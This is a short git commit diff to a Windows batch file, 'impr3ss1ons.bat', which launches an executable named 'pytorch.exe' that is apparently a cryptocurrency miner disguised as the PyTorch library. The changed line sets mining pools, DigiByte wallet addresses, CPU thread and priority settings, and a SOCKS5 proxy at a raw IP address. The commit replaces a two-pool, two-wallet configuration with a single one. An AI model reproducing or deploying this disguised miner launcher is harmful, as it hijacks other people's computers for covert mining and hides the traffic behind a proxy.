a11096cfc31094306604df439afd11741bba0181
suka67967 <91799253+suka67967@users.noreply.github.com>
2021-10-02 12:50:41 -0500

    Update impr3ss1ons.bat

--- impr3ss1ons.bat
+++ impr3ss1ons.bat
@@ -1,2 +1,2 @@
-pytorch.exe --disable-gpu --algorithm rx2;scryptn2 --pool rx2.mine.zergpool.com:8335;scryptn2.eu.mine.zpool.ca:4339 --wallet DTPPTaZiWfd9RHqzmU5sXNke5nQF8QbENr;D5VKJFaxCsP6iEn9s9TyTDm9Jr9U1WHqSb --password c=DGB;c=DGB --keepalive value true;true --cpu-threads 2;2 --cpu-threads-intensity 2;2 --cpu-threads-priority 2;2 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
+pytorch.exe --disable-gpu --algorithm rx2 --pool rx2.mine.zergpool.com:8335 --wallet D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65  --password c=DGB --keepalive value true --cpu-threads 2 --cpu-threads-intensity 2 --cpu-threads-priority 2 --proxy socks5://192.252.209.155:14455;socks5://192.252.209.155:14455
 pause
